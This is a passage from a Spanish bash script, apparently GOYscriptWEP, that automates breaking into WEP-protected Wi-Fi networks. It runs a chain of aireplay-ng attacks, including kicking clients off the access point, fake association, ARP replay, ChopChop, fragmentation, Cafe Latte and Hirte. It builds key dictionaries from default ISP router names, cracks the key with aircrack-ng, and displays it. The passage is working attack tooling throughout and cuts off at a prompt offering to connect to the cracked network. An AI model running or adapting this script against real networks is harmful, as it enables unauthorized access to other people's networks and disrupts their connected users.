				if [ "$CLIENTE" != "" ] && [ "$SLEEP" = "" ] #SI HAY UN CLIENTE CONECTADO LO EXPULSAMOS PARA CONSEGUIR EL NOMBRE AL RECONECTARSE
				then
					xterm -bg white -fg green $FUENTE $CLIENTE_VENTANA -title "ATAQUE -0 [Expulsando al cliente del AP]" -e $AIREPLAY -0 1 -a $MAC_AP -c $CLIENTE $INTERFAZ_MONITOR
					CLIENTE=""
					sleep $ESPERA &
				fi
			fi
			AIRODUMP_FUNCIONANDO=`ps $PARAMETRO_PS | grep airodump | grep -v grep`
			if [ "$AIRODUMP_FUNCIONANDO" = "" ]
			then
				break
			fi
		done
	fi
	if [ "$NOMBRE_AP" != "" ] && [[ "$NOMBRE_AP" != '< Oculta >' ]]
	then
		echo -e $verdeC"Encontrado: $blanco\"$NOMBRE_AP\""
		echo -e $grisC
	fi
	killall airodump-ng aireplay-ng > /dev/null 2>&1
fi
}

#MUESTRA LOS DATOS CON LOS QUE SE VA A TRABAJAR
mostrar_datos_seleccionados()
{
if [ "$FABRICANTE_INTERFAZ" = "" ]
then
	FABRICANTE_INTERFAZ=`$FABRICANTE "$MAC_INTERFAZ"`
fi
MAC=`echo $MAC_AP | cut -c-7` #recortamos la MAC XX:XX:XX
FABRICANTE_AP=`$FABRICANTE "$MAC_AP"`
echo -e "$amarillo"
echo -e "R E S U M E N"
echo -e "═════════════"
echo
echo -e "  "$subrayar"INTERFAZ"$parpadeoOFF""$amarillo":"
echo -e "    Nombre..........: $INTERFAZ"
echo -e "    Modo monitor....: $INTERFAZ_MONITOR"
echo -e "    MAC.............: $MAC_INTERFAZ"
echo -e "    Fabricante......: $FABRICANTE_INTERFAZ"
echo
echo -e "  "$subrayar"PUNTO DE ACCESO"$parpadeoOFF""$amarillo":"
echo -e "    Nombre..........: $NOMBRE_AP"
echo -e "    MAC.............: $MAC_AP"
echo -e "    Canal...........: $CANAL"
echo -e "    Fabricante......: $FABRICANTE_AP"
echo -e "$grisC"
}

#CAPTURAR TRÁFICO DE LA RED SELECCIONADA
captura_de_paquetes()
{
if [ "$INTERFAZ_GRAFICA" = "SI" ]
then
	xterm -hold $NORMAL $FUENTE $AIRODUMP_VENTANA -title "Capturando tráfico de \"$NOMBRE_AP\"" -e $AIRODUMP --bssid $MAC_AP -c $CANAL,$CANAL -w "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)" $INTERFAZ_MONITOR &
else
	$SCREEN -t "Captura" $AIRODUMP --bssid $MAC_AP -c $CANAL,$CANAL -w "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)" $INTERFAZ_MONITOR
fi
}

#ESPERA A QUE SE CIERRE EL COMANDO QUE SE PASA COMO PARÁMETRO
esperar_cierre()
{
AIREPLAY_FUNCIONANDO=`ps 2>/dev/null | grep "$1" | grep -v grep`
while [ "$AIREPLAY_FUNCIONANDO" != "" ]
do
	sleep 1
	AIREPLAY_FUNCIONANDO=`ps 2>/dev/null | grep "$1" | grep -v grep`
done
}

#ASOCIACION FALSA
asociacion_falsa()
{
iwconfig $INTERFAZ_MONITOR channel $CANAL 2>/dev/null
let INTENTOS_ASOCIACION=1
comprobar_airodump #controla si se ha cerrado la captura de tráfico
while [ "$AIRODUMP_FUNCIONANDO" != "" ]
do
	if [ "$INTERFAZ_GRAFICA" = "SI" ]
	then
		xterm $NORMAL $FUENTE $ASOCIACION_VENTANA -title "ATAQUE -1 [Asociación falsa] #$INTENTOS_ASOCIACION" -e $AIREPLAY -1 30 -o 1 -q 10 -e "$NOMBRE_AP" -a $MAC_AP -h $MAC_INTERFAZ $INTERFAZ_MONITOR
	else
		$SCREEN -dm -t "Asociación" $AIREPLAY -1 30 -o 1 -q 10 -e "$NOMBRE_AP" -a $MAC_AP -h $MAC_INTERFAZ $INTERFAZ_MONITOR
		esperar_cierre "negative-one -1"
	fi
	let INTENTOS_ASOCIACION=$INTENTOS_ASOCIACION+1
	comprobar_airodump #controla si se ha cerrado la captura de tráfico
done
}

#INYECCION DE TRÁFICO - ATAQUE 2
ataque_2()
{
if [ "$INTERFAZ_GRAFICA" = "SI" ]
then
	xterm $NORMAL $FUENTE $ATAQUE2_VENTANA -title "ATAQUE -2 [Selección automática del paquete]" -e $AIREPLAY -2 -p 0841 -F -c FF:FF:FF:FF:FF:FF -b $MAC_AP -h $MAC_INTERFAZ $INTERFAZ_MONITOR
else
	$SCREEN -dm -t "ataque-2" $AIREPLAY -2 -p 0841 -F -c FF:FF:FF:FF:FF:FF -b $MAC_AP -h $MAC_INTERFAZ $INTERFAZ_MONITOR
	esperar_cierre "$AIREPLAY -2 -p"
fi
comprobar_airodump
if [ "$AIRODUMP_FUNCIONANDO" != "" ] #si falla el ataque espera a que se cierre airodump para cerrarse
then
	if [ "$INTERFAZ_GRAFICA" = "SI" ]
	then
		xterm $HOLD $MAL $FUENTE $ATAQUE2_VENTANA -title "ATAQUE -2 [Selección automática del paquete] - ### FALLIDO ###" -e echo -e "\n\t### ATAQUE FALLIDO ### \c"
	fi
fi
}

#INYECCION DE TRÁFICO - ATAQUE 3 con cliente falso
ataque_3_1()
{
if [ "$INTERFAZ_GRAFICA" = "SI" ]
then
	xterm $NORMAL $FUENTE $ATAQUE3_1_VENTANA -title "ATAQUE -3 [Reinyección con cliente falso]" -e $AIREPLAY -3 -x 1024 -g 1000000 -b $MAC_AP -h $MAC_INTERFAZ -i $INTERFAZ_MONITOR $INTERFAZ_MONITOR
else
	$SCREEN -dm -t "ataque-3" $AIREPLAY -3 -x 1024 -g 1000000 -b $MAC_AP -h $MAC_INTERFAZ -i $INTERFAZ_MONITOR $INTERFAZ_MONITOR
	esperar_cierre "$AIREPLAY -3 -x"
fi
comprobar_airodump
if [ "$AIRODUMP_FUNCIONANDO" != "" ] #SI FALLA EL ATAQUE, ESPERA A QUE SE CIERRE AIRODUMP PARA CERRARSE
then
	if [ "$INTERFAZ_GRAFICA" = "SI" ]
	then
		xterm $HOLD $MAL $FUENTE $ATAQUE3_1_VENTANA -title "ATAQUE -3 [Reinyección con cliente falso] - ### FALLIDO ###" -e echo -e "\n\t### ATAQUE FALLIDO ### \c"
	fi
fi
}

#INYECCION DE TRÁFICO - ATAQUE 3 con cliente real
ataque_3_2()
{
CLIENTE="" #inicializamos la variable en la que guardaremos la MAC del cliente
INTENTOS_CLIENTE=1 #inicializamos la variable de intentos de ataque con cliente real
comprobar_airodump #comprobamos que airodump sigue activo
while [ "$AIRODUMP_FUNCIONANDO" != "" ] #mientras airodump siga activo se buscarán clientes asociados al AP
do
	while [ "$CLIENTE" = "" ] && [ "$AIRODUMP_FUNCIONANDO" != "" ]
	do
		CLIENTES=`cat $CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"-*.csv | grep -v WEP | grep $MAC_AP | awk -F ',' '{print $1}'| awk '{gsub(/ /,""); print}'` #TODOS LOS CLIENTES DETECTADOS
		CUANTOS_CLIENTES=`echo $CLIENTES | wc -w`
		CLIENTE=`echo $CLIENTES | awk '{print $1}'` #seleccionamos el primer cliente conectado
		if [ "$CLIENTE" = "$MAC_INTERFAZ" ] #si el cliente detectado somos nosotros
		then
			if [ $CUANTOS_CLIENTES -gt 1 ] #y si hay alguien más conectado, además de nosotros
			then
				CLIENTE=`echo $CLIENTES | awk '{print $2}'` #seleccionamos el segundo
			else
				CLIENTE="" #sinó reiniciamos la variable para que no se salga del bucle y siga buscando
				if [ "$INTERFAZ_GRAFICA" = "SI" ]
				then
					xterm $NORMAL $FUENTE $ATAQUE3_2_VENTANA -title "ATAQUE -3 [Reinyección con cliente real] - Buscando clientes..." -e 'echo -e "\n\tBuscando clientes... Sólo yo estoy asociado... \c"; sleep $ESPERA' &
				fi
			fi
		else
			if [ "$INTERFAZ_GRAFICA" = "SI" ]
			then
				xterm $NORMAL $FUENTE $ATAQUE3_2_VENTANA -title "ATAQUE -3 [Reinyección con cliente real] - Buscando clientes..." -e 'echo -e "\n\tBuscando clientes... \c"; sleep $ESPERA' &
			fi
		fi
		sleep $ESPERA
		comprobar_airodump
		if [ "$AIRODUMP_FUNCIONANDO" != "" ] #si airodump ya no está abierto sale de este bucle
		then
			break
		fi
	done
	if [ "$CLIENTE" != "" ] && [ "$AIRODUMP_FUNCIONANDO" != "" ]
	then
		CLIENTE_FABRICANTE=`$FABRICANTE "$CLIENTE"`
		echo -en $verdeC"\rExpulsando cliente $CLIENTE [$CLIENTE_FABRICANTE]... "
		echo -e $grisC
		if [ "$INTERFAZ_GRAFICA" = "SI" ]
		then
			xterm $BIEN $FUENTE $ASOCIACION_VENTANA -title "ATAQUE -0 [Expulsando al cliente del AP]" -e $AIREPLAY -0 1 -a $MAC_AP -c $CLIENTE $INTERFAZ_MONITOR
		else
			$SCREEN -dm -t "Expulsión" $AIREPLAY -0 1 -a $MAC_AP -c $CLIENTE $INTERFAZ_MONITOR
			esperar_cierre "$AIREPLAY -0 1"
		fi
		echo -e "$verdeC"Reinyectando tráfico usando el cliente $CLIENTE..." $grisC\n"
		if [ "$INTERFAZ_GRAFICA" = "SI" ]
		then
			xterm $BIEN $FUENTE $ATAQUE3_2_VENTANA -title "ATAQUE -3 [Reinyección con cliente real] #$INTENTOS_CLIENTE" -e $AIREPLAY -3 -b $MAC_AP -h $CLIENTE $INTERFAZ_MONITOR
		else
			$SCREEN -dm -t "Reinyección_real" $AIREPLAY -3 -b $MAC_AP -h $CLIENTE $INTERFAZ_MONITOR
			esperar_cierre "$AIREPLAY -3 -b"
		fi
		if [ $? -eq 0 ] #si falla el ataque se informa del suceso y se reintenta
		then
			echo -e $rojoC"La reinyección con el cliente $CLIENTE ha fallado. "$cyan"Reintentando..."$grisC"\n"
			CLIENTE=""
			sleep $ESPERA
		fi
	fi
	INTENTOS_CLIENTE=$((INTENTOS_CLIENTE+1))
	comprobar_airodump
done
}

#INYECCIÓN DE TRÁFICO - ATAQUE 4 [ChopChop]
ataque_4()
{
if [ "$INTERFAZ_GRAFICA" = "SI" ]
then
	xterm $NORMAL $FUENTE $ATAQUE4_VENTANA -title "ATAQUE -4 [ChopChop] - Esperando paquete ARP..." -e $AIREPLAY -4 -F -a $MAC_AP -h $MAC_INTERFAZ -i $INTERFAZ_MONITOR $INTERFAZ_MONITOR
else
	$SCREEN -dm -t "ChopChop_esperando" $AIREPLAY -4 -F -a $MAC_AP -h $MAC_INTERFAZ -i $INTERFAZ_MONITOR $INTERFAZ_MONITOR
	esperar_cierre "$AIREPLAY -4"
fi
comprobar_airodump #CONTROLA SI SE HA CERRADO LA CAPTURA DE TRÁFICO
if [ "$AIRODUMP_FUNCIONANDO" != "" ]
then
	if [ "$INTERFAZ_GRAFICA" = "SI" ]
	then
		xterm $INFORMA $FUENTE $ATAQUE4_VENTANA -title "ATAQUE -4 [ChopChop] - Generando paquete de reinyección..." -e $PACKETFORGE -0 -a $MAC_AP -h $MAC_INTERFAZ -k 255.255.255.255 -l 255.255.255.255.255 -y replay_dec-*.xor -w ./$CAPTURA/ataque4.cap
	else
		$SCREEN -dm -t "ChopChop_generando_paquete" $PACKETFORGE -0 -a $MAC_AP -h $MAC_INTERFAZ -k 255.255.255.255 -l 255.255.255.255.255 -y replay_dec-*.xor -w ./$CAPTURA/ataque4.cap
		esperar_cierre "$PACKETFORGE -0"
	fi
fi
comprobar_airodump #CONTROLA SI SE HA CERRADO LA CAPTURA DE TRÁFICO
if [ "$AIRODUMP_FUNCIONANDO" != "" ]
then
	if [ "$INTERFAZ_GRAFICA" = "SI" ]
	then
		xterm $BIEN $FUENTE $ATAQUE4_VENTANA -title "ATAQUE -4 [ChopChop] - Reinyectando..." -e $AIREPLAY -2 -F -r ./$CAPTURA/ataque4.cap $INTERFAZ_MONITOR
	else
		$SCREEN -dm -t "ChopChop_reinyectando" $AIREPLAY -2 -F -r ./$CAPTURA/ataque4.cap $INTERFAZ_MONITOR
		esperar_cierre "$AIREPLAY -2 -F -r ./$CAPTURA/ataque4"
	fi
fi
comprobar_airodump
if [ "$AIRODUMP_FUNCIONANDO" != "" ] #SI FALLA EL ATAQUE, ESPERA A QUE SE CIERRE AIRODUMP PARA CERRARSE
then
	if [ "$INTERFAZ_GRAFICA" = "SI" ]
	then
		xterm $HOLD $MAL $FUENTE $ATAQUE4_VENTANA -title "ATAQUE -4 [ChopChop] - ### FALLIDO ###" -e echo -e "\n\t### ATAQUE FALLIDO ### \c"
	fi
fi
}

#INYECCION DE TRÁFICO - ATAQUE 5 [Fragmentación]
ataque_5()
{
if [ "$INTERFAZ_GRAFICA" = "SI" ]
then
	xterm $NORMAL $FUENTE $ATAQUE5_VENTANA -title "ATAQUE -5 [Fragmentación] - Esperando paquete ARP..." -e $AIREPLAY -5 -F -b $MAC_AP -h $MAC_INTERFAZ $INTERFAZ_MONITOR
else
	$SCREEN -dm -t "Fragmentación_esperando" $AIREPLAY -5 -F -b $MAC_AP -h $MAC_INTERFAZ $INTERFAZ_MONITOR
	esperar_cierre "$AIREPLAY -5"
fi
comprobar_airodump #controla si se ha cerrado la captura de tráfico
if [ "$AIRODUMP_FUNCIONANDO" != "" ]
then
	if [ "$INTERFAZ_GRAFICA" = "SI" ]
	then
		xterm $INFORMA $FUENTE $ATAQUE5_VENTANA -title "ATAQUE -5 [Fragmentación] - Generando paquete de reinyección..." -e $PACKETFORGE -0 -a $MAC_AP -h $MAC_INTERFAZ -k 255.255.255.255 -l 255.255.255.255.255 -y fragment-*.xor -w ./$CAPTURA/ataque5.cap
	else
		$SCREEN -dm -t "Fragmentación_generando_paquete" $PACKETFORGE -0 -a $MAC_AP -h $MAC_INTERFAZ -k 255.255.255.255 -l 255.255.255.255.255 -y fragment-*.xor -w ./$CAPTURA/ataque5.cap
		esperar_cierre "$PACKETFORGE -0"
	fi
fi
comprobar_airodump #controla si se ha cerrado la captura de tráfico
if [ "$AIRODUMP_FUNCIONANDO" != "" ]
then
	if [ "$INTERFAZ_GRAFICA" = "SI" ]
	then
		xterm $BIEN $FUENTE $ATAQUE5_VENTANA -title "ATAQUE -5 [Fragmentación] - Reinyectando..." -e $AIREPLAY -2 -F -r ./$CAPTURA/ataque5.cap $INTERFAZ_MONITOR
	else
		$SCREEN -dm -t "Fragmentación_reinyectando" $AIREPLAY -2 -F -r ./$CAPTURA/ataque5.cap $INTERFAZ_MONITOR
		esperar_cierre "$AIREPLAY -2 -F -r ./$CAPTURA/ataque5"
	fi
fi
comprobar_airodump
if [ "$AIRODUMP_FUNCIONANDO" != "" ] #si falla el ataque espera a que se cierre airodump para cerrarse
then
	if [ "$INTERFAZ_GRAFICA" = "SI" ]
	then
		xterm $HOLD $MAL $FUENTE $ATAQUE5_VENTANA -title "ATAQUE -5 [Fragmentación] - ### FALLIDO ###" -e echo -e "\n\t### ATAQUE FALLIDO ### \c"
	fi
fi
}

#INYECCION DE TRÁFICO - ATAQUE 6 [Cafe Latte]
ataque_6()
{
if [ "$INTERFAZ_GRAFICA" = "SI" ]
then
	xterm $NORMAL $FUENTE $ATAQUE6_VENTANA -title "ATAQUE -6 [Cafe Latte]" -e $AIREPLAY -6 -F -D -b $MAC_AP -h $MAC_INTERFAZ $INTERFAZ_MONITOR
else
	$SCREEN -dm -t "Cafe_Latte" $AIREPLAY -6 -F -D -b $MAC_AP -h $MAC_INTERFAZ $INTERFAZ_MONITOR
	esperar_cierre "$AIREPLAY -6"
fi
comprobar_airodump
if [ "$AIRODUMP_FUNCIONANDO" != "" ] #si falla el ataque espera a que se cierre airodump para cerrarse
then
	if [ "$INTERFAZ_GRAFICA" = "SI" ]
	then
		xterm $HOLD $MAL $FUENTE $ATAQUE6_VENTANA -title "ATAQUE -6 [Cafe Latte] - ### FALLIDO ###" -e echo -e "\n\t### ATAQUE FALLIDO ### \c"
	fi
fi
}

#INYECCION DE TRÁFICO - ATAQUE 7 [Hirte Attack]
ataque_7()
{
if [ "$INTERFAZ_GRAFICA" = "SI" ]
then
	xterm $NORMAL $FUENTE $ATAQUE7_VENTANA -title "ATAQUE -7 [Hirte Attack]" -e $AIREPLAY -7 -F -D -b $MAC_AP -h $MAC_INTERFAZ $INTERFAZ_MONITOR
else
	$SCREEN -dm -t "Hirte_Attack" $AIREPLAY -7 -F -D -b $MAC_AP -h $MAC_INTERFAZ $INTERFAZ_MONITOR
	esperar_cierre "$AIREPLAY -7"
fi
comprobar_airodump
if [ "$AIRODUMP_FUNCIONANDO" != "" ] #SI FALLA EL ATAQUE, ESPERA A QUE SE CIERRE AIRODUMP PARA CERRARSE
then
	if [ "$INTERFAZ_GRAFICA" = "SI" ]
	then
		xterm $HOLD $MAL $FUENTE $ATAQUE7_VENTANA -title "ATAQUE -7 [Hirte Attack] - ### FALLIDO ###" -e echo -e "\n\t### ATAQUE FALLIDO ### \c"
	fi
fi
}

#ESPERA A QUE SE GENERE EL ARCHIVO .CSV PARA CONTINUAR
esperar_csv()
{
echo -en $cyan"Esperando a que se genere el archivo .CSV..."
let CONTADOR=1
ls $CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"-*.csv > /dev/null 2>&1
while [ ! $? -eq 0 ]
do
	echo -e ""$cyan".\c"
	if [ "$WRT" = "" ]
	then
		sleep 0.2
	else
		sleep 1
	fi
	let CONTADOR=$CONTADOR+1
	if [ $CONTADOR -gt 15 ]
	then
		echo -en ""$cyan"\a\033[15D               \033[15D"
		let CONTADOR=1
	fi
	ls $CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"-*.csv > /dev/null 2>&1
done
echo -e "$grisC\n"
}

#ESPERA A TENER SUFICIENTES "DATAs" PARA INICIAR LA BUSQUEDA DE LA CONTRASEÑA
detectar_ivs()
{
echo -e ""$cyan"Esperando a tener suficientes #Data..."$grisC""
echo
IVS=`cat ./$CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"-*.csv | grep "WEP" | awk '{print $11}' FS=',' | sed 's/ //g'`
while [ "$IVS" = "" ]
do
	IVS=`cat ./$CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"-*.csv | grep "WEP" | awk '{print $11}' FS=',' | sed 's/ //g'`
done
AIRODUMP_FUNCIONANDO=`ps $PARAMETRO_PS | grep airodump-ng | grep -v grep`
while [[ $IVS -lt 4 ]] && [[ "$AIRODUMP_FUNCIONANDO" != "" ]]
do
	sleep 1
	IVS=`cat ./$CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"-*.csv | grep "WEP" | awk '{print $11}' FS=',' | sed 's/ //g'`
	AIRODUMP_FUNCIONANDO=`ps $PARAMETRO_PS | grep airodump-ng | grep -v grep`
done	
}

#COMPROBAR SI ES UNA RED VULNERABLE A LA BUSQUEDA POR DICCIONARIO
comprobar_posible_diccionario()
{
CARACTERES=`echo -n "$NOMBRE_AP" | wc -c` #GUARDAMOS EN ESTA VARIABLE EL NUMERO DE CARACTERES DEL NOMBRE DE LA RED
WLANxx=`echo "$NOMBRE_AP" | cut -c-5`
JAZZTELxx=`echo "$NOMBRE_AP" | cut -c-8`
WLANxxxxxx=`echo "$NOMBRE_AP" | cut -c-4`
WIFIxxxxxx=`echo "$NOMBRE_AP" | cut -c-4`
YACOMxxxxxx=`echo "$NOMBRE_AP" | cut -c-5`
NOMBRE_AP_SPEEDTOUCH=`echo "$NOMBRE_AP" | cut -c-10`
OCTETOS_SPEEDTOUCH=`echo -n "$NOMBRE_AP" | sed 's/SpeedTouch//'`
NOMBRE_AP_ONO=`echo $NOMBRE_AP | cut -c-3`
if [ "$WLANxx" = "WLAN_" ] && [ $CARACTERES -eq 7 ]
then
	echo -e ""$verdeC"Red WLAN_xx detectada..."$grisC""
	echo
	echo -e ""$cyan"Creando diccionario..."$grisC""
	$WLANDECRYPTER $MAC_AP "$NOMBRE_AP" ./$CAPTURA/diccionario
else	
	if [ "$JAZZTELxx" = "JAZZTEL_" ] && [ $CARACTERES -eq 10 ]
	then
		echo -e ""$verdeC"Red JAZZTEL_xx detectada..."$grisC""
		echo
		echo -e ""$cyan"Creando diccionario..."$grisC""
		echo
		$JAZZTELDECRYPTER $MAC_AP "$NOMBRE_AP" ./$CAPTURA/diccionario
	else
		if [ "$WLANxxxxxx" = "WLAN" ] && [ $CARACTERES -eq 10 ]
		then
			echo -e ""$verdeC"Red WLANxxxxxx detectada..."$grisC""
			echo
			echo -e ""$cyan"Creando diccionario..."$grisC""
			echo
			$WLAN4xx "$NOMBRE_AP" $MAC_AP ./$CAPTURA/diccionario
		else
			if [ "$WIFIxxxxxx" = "WiFi" ] && [ $CARACTERES -eq 10 ]
			then
				echo -e ""$verdeC"Red WiFixxxxxx detectada..."$grisC""
				echo
				echo -e ""$cyan"Creando diccionario..."$grisC""
				echo
				$WLAN4xx "$NOMBRE_AP" $MAC_AP ./$CAPTURA/diccionario
			else
				if [ "$YACOMxxxxxx" = "YACOM" ] && [ $CARACTERES -eq 11 ]
				then
					echo -e ""$verdeC"Red YACOMxxxxxx detectada..."$grisC""
					echo
					echo -e ""$cyan"Creando diccionario..."$grisC""
					echo
					$WLAN4xx "$NOMBRE_AP" $MAC_AP ./$CAPTURA/diccionario
				else
					if [ "$NOMBRE_AP_SPEEDTOUCH" = "SpeedTouch" ] && [ $CARACTERES -eq 16 ]
					then
						echo -e ""$verdeC"Red \"SpeedTouchxxxxxx\" detectada."
						echo
						echo -e ""$cyan"Creando diccionario..."$grisC""
						echo
						$STKEYS -i "$OCTETOS_SPEEDTOUCH" -o ./$CAPTURA/diccionario > /dev/null 2>&1
					else
						if [ "$NOMBRE_AP_ONO" = "ONO" ] && [ $CARACTERES -eq 7 ]
						then
							echo -e ""$verdeC"Red \"ONOxxxx\" detectada."
							echo
							echo -e ""$cyan"Creando diccionario..."$grisC""
							echo
							$ONO4XX "$NOMBRE_AP" $MAC_AP wep ./$CAPTURA/diccionario > /dev/null 2>&1
						fi
					fi
				fi
			fi
		fi
	fi
fi
sleep 2
if [ ! -e "./$CAPTURA/diccionario" ]
then
	echo -e ""$rojoC"No es posible crear un diccionario para la red \""$NOMBRE_AP"\""$grisC""
	echo
fi
}

#COMIENZA A BUSCAR CONTRASEÑAS CON O SIN DICCIONARIO, DEPENDIENDO DE LA EXISTENCIA DE ESTE
buscar_clave()
{
rm -rf "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" > /dev/null 2>&1
echo
echo -e ""$cyan"Iniciando BÚSQUEDA DE CONTRASEÑA..."$grisC""
echo
MAC_GUIONES=`echo $MAC_AP | sed 's/:/-/g'`
if [[ -e "./$CAPTURA/diccionario" ]]
then
	echo -e ""$cyan"Iniciando búsqueda de contraseña con diccionario..."$grisC""
	echo
	if [ "$INTERFAZ_GRAFICA" = "SI" ]
	then
		xterm $INFORMA $FUENTE $AIRCRACK_VENTANA -title "BUSCANDO CONTRASEÑA CON DICCIONARIO" -e $AIRCRACK -w ./$CAPTURA/diccionario ./$CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"*.cap -l "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt"
	else
		$SCREEN -t "aircrack_con_diccionario" $AIRCRACK -w ./$CAPTURA/diccionario ./$CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"*.cap -l "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt"
		AIRCRACK_FUNCIONANDO=`ps $PARAMETRO_PS | grep aircrack-ng | grep -v grep`
		while [ "$AIRCRACK_FUNCIONANDO" != "" ]
		do
			sleep 1
			AIRCRACK_FUNCIONANDO=`ps $PARAMETRO_PS | grep aircrack-ng | grep -v grep`
		done
	fi
	sleep 3
fi
if [ ! -e "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" ]
then
	if [[ -e "./$CAPTURA/diccionario" ]]
	then
		echo -e ""$rojoC"La búsqueda de contraseña con diccionario no ha dado resultado."$gris"\n"
	fi
	killall -q aircrack-ng > /dev/null 2>&1
	echo -e ""$cyan"Iniciando búsqueda de contraseña sin diccionario..."$grisC""
	echo
	if [ "$INTERFAZ_GRAFICA" = "SI" ]
	then
		xterm $NORMAL $FUENTE $AIRCRACK_VENTANA -title "BUSCANDO CONTRASEÑA" -e $AIRCRACK ./$CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"*.cap -l "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt"
	else
		$SCREEN -t "aircrack" $AIRCRACK ./$CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"*.cap -l "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt"
		AIRCRACK_FUNCIONANDO=`ps $PARAMETRO_PS | grep aircrack-ng | grep -v grep`
		while [ "$AIRCRACK_FUNCIONANDO" != "" ]
		do
			sleep 1
			AIRCRACK_FUNCIONANDO=`ps $PARAMETRO_PS | grep aircrack-ng | grep -v grep`
		done
	fi
fi
}

#MUESTRA LA CONTRASEÑA EN DECIMAL Y EN ASCII
mostrar_clave()
{
ARCHIVO_CLAVE=`find $CLAVES | grep "$NOMBRE_AP ($MAC_GUIONES).txt"`
echo
echo -e ""$verdeC""$parpadeoON"¡¡¡ CONTRASEÑA ENCONTRADA !!! "$parpadeoOFF""$gris" "
echo
matar_procesos "Cerrando los procesos abiertos..."
rm ./$CAPTURA/replay_* > /dev/null 2>&1
CLAVE_HEXADECIMAL=`cat "$ARCHIVO_CLAVE"`
CLAVE_ASCII=`echo "$CLAVE_HEXADECIMAL" | $XXD -r -p`
echo -e "\n$CLAVE_ASCII" >> "$ARCHIVO_CLAVE" #añadimos a la segunda línea del archivo la contraseña en formato ASCII
clear
echo -e $grisC
echo -e "La contraseña para la red "$cyan$"$NOMBRE_AP"$grisC" es:"
echo
echo -e "En hexadecimal...: "$verdeC"$CLAVE_HEXADECIMAL"$grisC""
echo -e "En ASCII.........: "$verdeC"$CLAVE_ASCII"$grisC""
echo
echo -e "Se ha creado el archivo "$cyan"\""$NOMBRE_AP \($MAC_GUIONES\).txt"\" "$grisC""
echo -e "en el directorio $blanco\"$CLAVES\"$grisC, el cual contiene la contraseña"
echo "en formato hexadecimal y ASCII respectivamente."
echo
mostrar_duracion
rm -rf *.cap > /dev/null 2>&1
rm -rf *.xor > /dev/null 2>&1
rm -rf ./$CAPTURA/"$NOMBRE_AP ($MAC_GUIONES)"* > /dev/null 2>&1 #BORRA TODAS LAS CAPTURAS REALIZADAS PARA LA RED DESENCRIPTADA
}

#MUESTRA LA DURACIÓN DEL PROCESO DESGLOSADA
mostrar_duracion()
{
echo -e $cyanC"Duración del proceso...: "$blanco"\c"
if [ $dias -ne 0 ]	# DESGLOSE EN DIAS, HORAS, MINUTOS Y SEGUNDOS DE LA DURACIÓN DEL PROCESO
then
	if [ $dias -eq 1 ]
	then
		echo -e "$dias día\c"
	else
		echo -e "$dias días\c"
	fi
	if [ $horas -ne 0 ] && [ $minutos -eq 0 ] && [ $segundos -eq 0 ]
	then
		echo -e " y \c"
	else
		if [ $horas -eq 0 ] && [ $minutos -ne 0 ] && [ $segundos -eq 0 ]
		then
			echo -e " y \c"
		else
			if [ $horas -eq 0 ] && [ $minutos -eq 0 ] && [ $segundos -ne 0 ]
			then
				echo -e " y \c"
			else
				if [ $horas -ne 0 ] || [ $minutos -ne 0 ] || [ $segundos -ne 0 ]
				then
					echo -e ", \c"
				fi
			fi
		fi
	fi
fi
if [ $horas -ne 0 ]
then
	if [ $horas -eq 1 ]
	then
		echo -e "$horas hora\c"
	else
		echo -e "$horas horas\c"
	fi
	if [ $minutos -ne 0 ] && [ $segundos -eq 0 ]
	then
		echo -e " y \c"
	fi
	if [ $minutos -eq 0 ] && [ $segundos -ne 0 ]
	then
		echo -e " y \c"
	fi
	if [ $minutos -ne 0 ] && [ $segundos -ne 0 ]
	then
		echo -e ", \c"
	fi
fi
if [ $minutos -ne 0 ]
then
	if [ $minutos -eq 1 ]
	then
		echo -e "$minutos minuto\c"
	else
		echo -e "$minutos minutos\c"
	fi
	if [ $segundos -ne 0 ]
	then
		echo -e " y \c"
	fi
fi
if [ $segundos -ne 0 ]
then
	if [ $segundos -eq 1 ]
	then
		echo -e "$segundos segundo\c"
	else
		echo -e "$segundos segundos\c"
	fi
else
	echo -e "$segundos segundos\c"
fi
echo -e "$grisC"
echo
}

#DESACTIVAR EL MODO MONITOR EN LA INTERFAZ VIRTUAL MON0
desactivar_modo_monitor()
{
echo -e ""$cyan"Desactivando modo monitor..."$grisC""
echo
$AIRMON stop $INTERFAZ > /dev/null 2>&1
$AIRMON stop mon0 > /dev/null 2>&1
}

comprobar_ayuda()
{
echo -e $blanco
echo "GOYscriptWEP $VERSION by GOYfilms"
echo -e $grisC
echo "Modo de uso: $0 [interfaz]"
echo
echo "OPCIONES:"
echo "    -l, -L   :Usar la lista de redes detectadas la última vez"
echo "    --datos  :Pasar como parámetros todos los datos necesarios"
echo "              en el siguiente orden:"
echo "              BSSID ESSID CANAL INTERFAZ"
echo
echo "Ejemplos: $0"
echo "          $0 wlan1"
echo "          $0 wlan0 -l"
echo "          $0 -L"
echo "          $0 --datos 01:23:45:67:89:AB mi_casa 5 wlan0"
echo -e "$grisC"
exit 1
}

conectar_internet()
{
echo -en ""$cyan"¿Quieres conectarte a la red \"$NOMBRE_AP\"? [S/N]: ""$amarillo\c"
read -n 1 RESPUESTA
while [ "$RESPUESTA" != "s" ] && [ "$RESPUESTA" != "n" ] && [ "$RESPUESTA" != "S" ] && [ "$RESPUESTA" != "N" ]
do
	echo -en ""$rojoC"  Respuesta no válida"
	echo -en "$cyan""\r"¿Quieres conectarte a la red \"$NOMBRE_AP\"? [S/N]: "$amarillo\c"
	read -n 1 RESPUESTA
done
echo -en "                     " # BORRA EL MENSAJE DE "Respuesta no válida"
if [ "$RESPUESTA" = "s" ] || [ "$RESPUESTA" = "S" ]
then
